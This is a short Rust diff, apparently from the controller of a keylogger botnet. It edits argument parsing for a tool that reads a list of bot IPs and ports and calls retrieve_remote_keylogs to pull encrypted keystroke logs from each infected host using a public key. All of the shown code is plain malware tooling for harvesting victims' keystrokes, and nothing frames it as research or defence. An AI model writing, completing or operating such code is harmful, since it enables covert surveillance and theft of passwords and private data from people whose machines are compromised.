@@ -37,7 +37,6 @@ fn main() {
         .arg(clap::Arg::with_name("bot_addr")
             .long("bot-addr")
             .help("Ips and ports to retrieve encrypted logs from")
-            .requires("retrieve")
             .takes_value(true)
             .value_name("FILE")
             .default_value("bot_addr.list"))
@@ -67,7 +66,7 @@ fn main() {
         });
         use std::io::Read;
         let mut public_key = Vec::new();
-        std::fs::File::open(args.values_of("asymmetric_keys").unwrap().collect::<Vec<&str>>()[0]).expect("Wrong public file").read_to_end(&mut public_key).unwrap();
+        std::fs::File::open(args.values_of("PUB_KEY").unwrap().collect::<Vec<&str>>()[0]).expect("Wrong public file").read_to_end(&mut public_key).unwrap();
         //TODO: make retrieval streamified
         let encrypted_data_paths: Vec<Vec<std::path::PathBuf>> = bot_addr_list.iter().map(|bot_addr| {
             retrieve_remote_keylogs(bot_addr, &public_key).iter().map(|&(ref name, ref data)| {
